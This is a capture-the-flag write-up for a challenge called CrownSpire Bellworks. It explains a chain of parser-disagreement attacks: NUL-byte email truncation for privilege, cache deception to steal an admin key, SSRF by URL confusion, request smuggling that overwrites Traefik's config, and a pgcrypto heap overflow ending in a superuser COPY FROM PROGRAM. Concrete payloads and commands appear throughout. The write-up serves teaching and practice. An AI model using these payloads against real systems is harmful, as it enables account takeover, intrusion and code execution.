# CrownSpire Bellworks Writeup

## TL;DR

This challenge is a long chain where several programs disagree about how to
interpret the same input:

1. Confuse Node.js and PHP about where an email address ends to become a
   privileged **bell-scribe**.
2. Confuse Varnish and Nginx about a URL to cache an administrator-only page.
3. Steal the administrator API key and reset the administrator password.
4. Confuse Python's URL parser and `requests` to reach an internal-only service.
5. Confuse `requests` and Oat++ about an invalid header to smuggle a second HTTP
   request.
6. Use that request to rewrite Traefik's configuration and expose PostgreSQL.
7. Exploit PostgreSQL/`pgcrypto` (CVE-2026-2005), become the database superuser,
   and run `/readflag`.

The flag was:

```text
HTB{d0n't_trust_th3_libraries_y0u_us3_a9b818a230e45982dbf2448f13a8715e}
```

The complete automated exploit is in [`solve.py`](solve.py).

---

## Target

I was given these two endpoints:

```text
154.57.164.77:31763
154.57.164.77:32485
```

A quick scan showed that `31763` was filtered while `32485` was the web
application:

```bash
nmap -Pn -sT -sV -p31763,32485 154.57.164.77
curl http://154.57.164.77:32485/api/standing
```

The API answered:

```json
{"authed":false,"role":"guest","label":"Viewer"}
```

Therefore, I ignored `31763` as the accidental extra endpoint mentioned in the
challenge note. An important detail is that I did **not** need a separate
PostgreSQL port. Later in the exploit, the web port `32485` itself is changed
into a PostgreSQL port.

I used this base URL throughout the web portion:

```text
http://154.57.164.77:32485
```

---

## Understanding the application

The container runs quite a few services:

```text
Internet
   |
   v
Traefik :8080
   |
   v
Varnish :7100
   |
   v
Nginx :7001
   |---- Node.js registry :7000
   |---- PHP/SimpleSAMLphp
   `---- Flask courier :7002

Internal only:
   Oat++ "inner ward" :7200
   PostgreSQL :5432
```

The layers are not just decorative. Almost every vulnerability comes from two
adjacent layers parsing the same email, URL, header, or request differently.
The challenge name and story hint at sending one command through several
"voices," and that is essentially what the exploit does.

---

## Step 1: Becoming a bell-scribe with a NUL byte

New users normally receive the low-privilege `petitioner` role. Users whose
email ends in the internal domain receive the better `clerk` role:

```javascript
const LOCAL_DOMAIN = '@vaultrune.valyssar.local';
const role = canon(email).endsWith(LOCAL_DOMAIN) ? 'clerk' : 'petitioner';
```

The signup form blocks anyone who directly registers an address in that
domain:

```javascript
if (canon(username).endsWith(LOCAL_DOMAIN)) {
  return 'Marks in the vaultrune.valyssar.local register are issued by the Crown';
}
```

The trick is to register this shape of username:

```python
email = "bell123@vaultrune.valyssar.local\x00\u200b"
```

In plain English:

- The visible part is an internal email address.
- It is followed by a NUL byte (`\x00`) and a zero-width character (`\u200b`).
- Node.js sees the complete string, so it does **not** end with the protected
  domain and signup is allowed.
- During the PHP/SAML trip, the NameID is effectively cut off at the NUL.
- The Node.js SAML callback then receives
  `bell123@vaultrune.valyssar.local`.
- That value really does end with the internal domain, so the application
  assigns the `clerk` role.

The solver registers the account and follows both SAML forms:

```python
session = requests.Session()
session.post(
    base + "/signup",
    json={
        "email": email,
        "displayName": "Rin",
        "password": password,
    },
)

# GET /login, submit the IdP form, then submit the SAML response.
```

Confirmation comes from:

```http
GET /api/standing
```

which now reports the `scribe` standing used by the UI for a clerk.

### Layman's version

One receptionist reads the whole name on our fake ID, while the next
receptionist stops reading at an invisible character. The first receptionist
lets us create it because it looks external; the second believes it is an
official internal identity.

---

## Step 2: Making the admin bot cache its secret page

Clerks may submit paths through `/appeals`. A review bot periodically logs in
as the Keeper (administrator) and visits each submitted path.

That alone is not enough, because we cannot read the bot's response. The useful
part is the Varnish cache rule:

```vcl
if (req.method == "GET" && req.url ~ "^/static/") {
    return (hash);
}
```

Anything whose raw URL begins with `/static/` is cached for 60 seconds.
Meanwhile, Nginx normalizes paths before routing them. This produces another
parser disagreement.

I submitted:

```text
/static/..%2fadmin/account?cb=<random-value>
```

The same bytes mean two different things:

- **Varnish** looks at the raw string, sees `/static/`, and decides it is safe
  cacheable static content.
- **Nginx** decodes `%2f` as `/` and resolves `..`, so it routes the request to
  `/admin/account`.

The review bot visits the path with its administrator cookie. Nginx gives it
the real administrator account page, and Varnish stores that privileged
response under the misleading `/static/...` cache key.

After waiting slightly longer than the bot's five-second polling interval, I
requested the **exact same raw path without a cookie**. Varnish served the
cached administrator page, including:

```html
data-api-key="..."
```

Two small details mattered:

1. I used a random `cb` query parameter to avoid old cache entries.
2. I did not probe the URL early. An early anonymous request would cache a
   `403` before the bot arrived.

I also used Python's low-level `http.client` for the final fetch. Higher-level
clients may rewrite or normalize the encoded slash, while this exploit needs
the lower-case `%2f` to arrive byte-for-byte.

### Layman's version

The cache labels a box by looking only at its original address, while the web
server opens the box using a cleaned-up address. We make the admin bot request
a secret page inside a box labelled "public static file," then ask the cache
for that box ourselves.

---

## Step 3: Turning the API key into an admin session

The stolen sealing key can reset the Keeper's password without an existing
administrator session:

```http
POST /api/account/reset-password
Content-Type: application/json

{
  "api_key": "<stolen-key>",
  "new_password": "Rin-<random>"
}
```

After the reset, I logged in at `/admin/login` as:

```text
username: warden
password: the password chosen above
```

This gave access to `/admin/courier`, a service that sends HTTP requests to a
user-supplied address.

---

## Step 4: SSRF through URL parser disagreement

The courier tries to prevent server-side request forgery (SSRF). It parses the
submitted URL using Python's `urlsplit()`, resolves its hostname, and refuses
private or loopback addresses.

However, validation and the later `requests.request()` call do not interpret a
backslash in the URL in exactly the same way.

The payload was:

```text
http://127.0.0.1:7200\@1.1.1.1/../status
```

For validation, `urlsplit()` sees the hostname as the public address
`1.1.1.1`, so the safety check passes. The `requests`/urllib3 path treats the
authority differently and connects to:

```text
127.0.0.1:7200
```

That is the internal Oat++ "inner ward" service.

Using the numeric public IP is intentional. My first version used
`example.com`, which worked locally but could stall while the remote container
waited for DNS. `1.1.1.1` passes the public-address check without requiring any
DNS lookup.

At this point we can reach the inner service, but we still need to make it
perform a `PUT /records/write`. The courier only sends an outer `POST`, so one
more disagreement is required.

---

## Step 5: Smuggling a second request through Oat++

The courier accepts custom outbound headers. I supplied this intentionally
invalid header:

```json
{"X Y": "z"}
```

The space makes it malformed according to normal HTTP header syntax.
`requests` still sends it, but Oat++ stops while parsing it. Due to the
synchronous Oat++ reader's error-handling behavior, the parse failure is not
properly propagated. Most importantly, the automatically generated outer
`Content-Length` is no longer processed.

Oat++ therefore treats the first request as having an empty body:

```text
method=POST
body_len=0
```

The bytes that the courier intended as that POST's body remain unread on the
TCP connection. Oat++ then treats those bytes as a brand-new HTTP request.
That leftover body was:

```http
PUT /records/write HTTP/1.1
Host: inner
Content-Length: <length>
Connection: close

{"path":"/etc/traefik/dynamic.yml","data":"<base64-data>"}
```

The inner service's `/records/write` handler decodes `data` and writes it to
the requested path. Because both the inner service and Traefik run as the
`app` user, the file is writable.

This is request smuggling in a slightly unusual form: rather than sneaking a
second request through a public reverse proxy, we convince one internal HTTP
server to see two requests where the Python sender believed it sent one.

---

## Step 6: Replacing the web service with PostgreSQL

The smuggled request overwrote `/etc/traefik/dynamic.yml` with:

```yaml
tcp:
  routers:
    pg:
      entryPoints: ["web"]
      rule: "HostSNI(`*`)"
      service: pg
  services:
    pg:
      loadBalancer:
        servers:
          - address: "127.0.0.1:5432"
```

Traefik watches this file and reloads it automatically. The public `web`
entrypoint now becomes a raw TCP proxy to the internal PostgreSQL server.

This explains the apparently strange remote setup:

```text
Before overwrite:
154.57.164.77:32485 -> HTTP application

After overwrite:
154.57.164.77:32485 -> PostgreSQL
```

The HTTP site disappears after this step. That behavior is expected and is
also why the solver gathers everything it needs before rewriting the file.

I verified the switch with a PostgreSQL connection rather than another HTTP
request:

```bash
psql "host=154.57.164.77 port=32485 user=ctf_user dbname=ctfdb connect_timeout=5"
```

The `ctf_user` role has no password but is intentionally low privilege.

---

## Step 7: Exploiting pgcrypto (CVE-2026-2005)

The database is PostgreSQL 17.7 with the `pgcrypto` extension installed:

```sql
CREATE EXTENSION IF NOT EXISTS pgcrypto;
CREATE ROLE ctf_user WITH LOGIN INHERIT;
```

The extension's OpenPGP decryption code is vulnerable to CVE-2026-2005. At a
high level, a specially built encrypted OpenPGP message makes the extension
copy too much data into a heap object. The overflow damages nearby buffer
metadata.

This is the most technical part, but the overall goal is simple:

```text
small memory corruption
        |
        v
leak an address
        |
        v
read arbitrary memory
        |
        v
find PostgreSQL's randomized base address
        |
        v
write to PostgreSQL's current-user variable
        |
        v
become database superuser
```

### 7.1 Building valid-looking OpenPGP packets

The exploit generates a 3072-bit RSA key and constructs:

- an OpenPGP secret-key packet;
- public-key encrypted session-key packets;
- AES-encrypted literal-data packets.

The packets are valid enough to reach the vulnerable `pgcrypto` code, but
their contents are laid out to overflow one internal `MBuf` structure into the
next one.

They are passed to:

```sql
SELECT pgp_pub_decrypt_bytea(
    '<crafted message>'::bytea,
    '<crafted secret key>'::bytea
);
```

### 7.2 Leaking a heap pointer

The first corruption replaces part of a destination buffer with controlled
metadata. Cleanup then tries to free a corrupted pointer. PostgreSQL helpfully
includes that pointer in its error:

```text
pfree called with invalid pointer 0x55...
```

The solver extracts this as a stable address inside the current PostgreSQL
backend's heap.

### 7.3 Turning the bug into arbitrary memory reads

For the next payload, I forged an `MBuf` whose start, read, and end pointers
refer to an address of my choice. When the decryption function returns its
result, it returns bytes from that chosen address instead.

I used this primitive to read a 64 KiB window around the leaked heap pointer.
That region contains other live pointers, including pointers into the
PostgreSQL executable.

### 7.4 Defeating ASLR/PIE with matching debug symbols

PostgreSQL is position-independent, so its executable is loaded at a random
address. Knowing that a variable is at offset `0x1234` in the file is not
enough; we also need the random runtime base.

The challenge image includes debug symbols matching its exact PostgreSQL
build. The solver reads them with:

```bash
readelf -sW postgres.debug
```

It then:

1. Collects pointer-looking values from the leaked memory.
2. Matches their lower 12 bits against known symbol offsets. ASLR moves whole
   pages, so those lower bits remain unchanged.
3. Lets all matching symbols "vote" for possible PIE base addresses.
4. Tests the best candidates by reading the `CurrentUserId` variable.
5. Accepts the candidate whose value matches the OID of `ctf_user`.

The remote run found:

```text
leaked heap pointer: 0x55b626b4fe38
PostgreSQL PIE base: 0x55b5fd1dd000
```

The exact addresses change between instances.

### 7.5 Changing our database identity

The final corrupted-buffer payload reverses the data flow and gives an
arbitrary memory write. In the same PostgreSQL connection, it writes the OID
`10` into the user-ID state around `CurrentUserId`.

OID 10 is PostgreSQL's bootstrap superuser. A check afterward confirms:

```sql
SELECT current_user::regrole::oid;
```

returns:

```text
10
```

It is important to keep the same connection here. PostgreSQL normally creates
a separate backend process per connection, and changing one backend's memory
does not magically alter every other connection.

### 7.6 Running `/readflag`

Once PostgreSQL believes the current session is superuser, `COPY FROM PROGRAM`
can execute an operating-system command:

```sql
CREATE TEMP TABLE crown_flag(line text);
COPY crown_flag FROM PROGRAM '/readflag';
SELECT line FROM crown_flag;
```

That returns the flag.

---

## Debug-symbol preparation

The memory exploit needs symbols from the **exact** PostgreSQL build used by
the challenge. The solver can extract them from a locally built challenge
container:

```bash
python3 solve.py \
  --url http://127.0.0.1:1337 \
  --container <container-name> \
  --symbols /tmp/postgres17.7.debug
```

Internally, it reads the PostgreSQL build ID:

```bash
docker exec <container-name> \
  readelf -n /usr/lib/postgresql/17/bin/postgres
```

and copies the matching file from:

```text
/usr/lib/debug/.build-id/<first-two-build-id-chars>/<remaining-chars>.debug
```

I prepared the symbol file before changing Traefik because the web portion
cannot be repeated after the port has become PostgreSQL.

---

## Running the complete solver

Dependencies:

```bash
python3 -m pip install \
  requests beautifulsoup4 psycopg2-binary pycryptodome
```

Remote command:

```bash
python3 -u solve.py \
  --url http://154.57.164.77:32485 \
  --symbols /tmp/postgres17.7.debug
```

Successful output:

```text
[*] obtained bell-scribe session through SAML NameID truncation
[*] recovered the Keeper API key from Varnish
[*] reset the Keeper password and obtained an admin session
[*] overwrote Traefik configuration through the smuggled inner-ward PUT
[*] Traefik now exposes PostgreSQL on the challenge port
[*] leaked deterministic backend heap pointer: 0x55b626b4fe38
[*] PIE candidates: 0x55b5fd1dd000/33, ...
[*] confirmed PostgreSQL PIE base 0x55b5fd1dd000 (33 votes)
HTB{d0n't_trust_th3_libraries_y0u_us3_a9b818a230e45982dbf2448f13a8715e}
```

If Traefik has already been changed and the port is currently PostgreSQL, the
web stages can be skipped:

```bash
python3 -u solve.py \
  --url http://154.57.164.77:32485 \
  --symbols /tmp/postgres17.7.debug \
  --skip-web
```

---

## Final thoughts

No single early bug immediately gives command execution. The challenge instead
rewards following small inconsistencies across a complicated stack:

- JavaScript strings versus PHP/XML strings;
- raw cache keys versus normalized web paths;
- one Python URL parser versus another;
- one HTTP implementation versus another;
- and finally trusted native parsing code inside PostgreSQL.

That also explains the flag: the dangerous assumption was that every library
would interpret the same input in the same way. They did not.
